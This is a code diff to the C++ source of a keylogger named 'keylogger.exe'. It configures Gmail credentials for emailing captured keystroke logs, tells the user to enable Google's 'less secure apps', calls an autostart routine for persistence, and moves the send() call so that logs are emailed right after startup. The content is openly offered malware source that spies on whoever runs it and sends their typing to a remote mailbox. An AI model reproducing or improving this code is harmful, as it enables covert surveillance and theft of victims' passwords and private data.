@@ -13,7 +13,7 @@
 using namespace std; //I have in my habit using that
 
 //U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
-const string exe_name = "keylogger.exe";
+const string exe_name = "keylogger.exe"; //Make sure its same as name of your file, else autostart and autoinstall 
 const string LogFileName = "data.th";
 const string EmailFrom = "example@gmail.com";
 const string EmailFromPassword = "YourPassowrd";
@@ -165,7 +165,6 @@ int main()
 	Sleep(500);
 
 	autostart();
-	send();
 
 	string minutes;
 	int minutesInt;
@@ -176,11 +175,11 @@ int main()
 	time(&t);
 	tt = localtime(&t);
 
-	//Log at start of program
+		//Log at start of program
 		LogFile.open(LogFileName, fstream::app);
 		LogFile << endl << "###" << asctime(tt);
 		LogFile.close();
-	
+		send();
 
 	while (true) {
 		
